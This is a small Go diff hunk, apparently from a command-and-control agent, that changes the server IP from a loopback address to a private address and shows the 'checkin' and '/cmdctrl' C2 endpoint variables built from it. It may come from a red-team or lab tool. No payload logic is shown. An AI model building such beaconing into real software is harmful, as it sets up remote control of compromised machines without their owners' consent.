@@ -17,7 +17,7 @@ import (
 )
 
 var (
-	ip               string = "127.0.0.1" //put the ip of your server.
+	ip               string = "172.31.24.10" //put the ip of your server.
 	url              string = ""
 	checkin_endpoint string = "https://" + ip + "/checkin" //added (s)
 	c2_endpoint      string = "https://" + ip + "/cmdctrl" //added (s)
